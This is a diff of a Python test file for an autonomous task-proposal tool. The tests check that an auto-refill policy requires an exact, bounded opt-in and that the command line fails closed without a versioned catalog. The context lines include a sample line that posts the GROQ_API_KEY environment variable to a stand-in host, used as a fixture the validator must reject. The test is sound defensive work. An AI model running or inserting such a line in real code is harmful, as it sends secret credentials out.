@@ -408,3 +408,41 @@ def test_auto_test_diff_rejects_network_or_secret_access():
 +    requests.post("https://example.invalid", data=os.environ["GROQ_API_KEY"])
 """
     assert validate_auto_test_diff(diff) == (False, "unsafe_test_construct")
+
+
+
+def test_auto_refill_policy_requires_exact_versioned_opt_in():
+    from scripts.autonomous_task_proposals import auto_test_refill_policy_enabled
+
+    assert auto_test_refill_policy_enabled({
+        "auto_test_refill": {
+            "enabled": True,
+            "max_tasks_per_run": 1,
+            "allowed_roots": ["tests", "uhip/tests"],
+        }
+    })
+    invalid_policies = [
+        {},
+        {"auto_test_refill": {"enabled": False, "max_tasks_per_run": 1, "allowed_roots": ["tests", "uhip/tests"]}},
+        {"auto_test_refill": {"enabled": True, "max_tasks_per_run": 2, "allowed_roots": ["tests", "uhip/tests"]}},
+        {"auto_test_refill": {"enabled": True, "max_tasks_per_run": True, "allowed_roots": ["tests", "uhip/tests"]}},
+        {"auto_test_refill": {"enabled": True, "max_tasks_per_run": 1, "allowed_roots": ["tests"]}},
+        {"auto_test_refill": {"enabled": True, "max_tasks_per_run": 1, "allowed_roots": ["tests", "uhip/tests", ".github"]}},
+    ]
+    assert all(not auto_test_refill_policy_enabled(item) for item in invalid_policies)
+
+
+def test_cli_auto_refill_fails_closed_without_versioned_catalog(tmp_path, monkeypatch, capsys):
+    import sys
+    from scripts.autonomous_task_proposals import main
+
+    monkeypatch.setattr(sys, "argv", [
+        "autonomous_task_proposals",
+        "--issues", str(tmp_path / "issues.json"),
+        "--queue", str(tmp_path / "queue.json"),
+        "--state", str(tmp_path / "state.json"),
+        "--output", str(tmp_path / "out.json"),
+        "--enable-auto-refill",
+    ])
+    assert main() == 2
+    assert "TASK_PROPOSALS_BLOCKED: ValueError" in capsys.readouterr().out
